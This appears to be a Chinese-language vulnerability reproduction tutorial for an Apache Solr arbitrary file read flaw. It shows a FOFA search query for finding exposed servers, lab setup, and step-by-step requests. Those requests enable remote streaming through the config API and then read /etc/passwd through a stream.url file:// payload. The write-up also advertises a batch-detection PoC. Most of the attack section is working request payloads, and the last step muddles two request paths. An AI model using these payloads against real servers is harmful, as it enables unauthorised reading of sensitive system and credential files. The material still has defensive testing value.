Apache Solr 任意文件读取漏洞

Apache Solr介绍

Apache Solr是一个开源的搜索服务，使用Java语言开发，主要基于HTTP和Apache Lucene实现的。它是一个独立的企业级搜索应用服务器，它对外提供类似于Web-service的API接口。用户可以通过http请求，向搜索引擎服务器提交一定格式的XML文件，生成索引；也可以通过Http Get操作提出查找请求，并得到XML格式的返回结果

漏洞描述

Apache Solr存在任意文件读取漏洞攻击者可以在未授权的情况下获取目标服务器敏感文件

漏洞影响

全版本

fofa查询语句app="Apache-Solr"

环境搭建

关注公众号回复ApacheSolr获取环境安装包与批量检测poc

进入安装包文件bin目录下，启动（需要java环境）

./solr start

创建核心

./solr create -c test

此时我们访问http://127.0.0.1:8983可以看到我们的环境和刚刚创建的核心

点击Core Admin可以看到出现核心的详细内容，必须得有这个我们才能对漏洞进行复现攻击。

漏洞复现

首先使用brup抓包

修改get请求

/solr/admin/cores?action=STATUS&core=test

从返回包中我们可以获取到当前核心的名称，这个十分重要，因为他是我们后面攻击目标的路径。

然后再次使用brup发送请求包

修改请求为post，请求页面为

/solr/核心名称/config

在请求头加上

Content-type:application/json

data为

{"set-property" : {"requestDispatcher.requestParsers.enableRemoteStreaming":true}}

出现类似下图中的This response format is experimental字样则证明存在漏洞。

然后就可以尝试攻击读取敏感文件信息了

请求页面为

/solr/acdbcategories/debug/dump?param=ContentStreams

/solr/核心名称/config

在请求头加上

Content-type:application/json

data为

stream.url=file:///etc/passwd
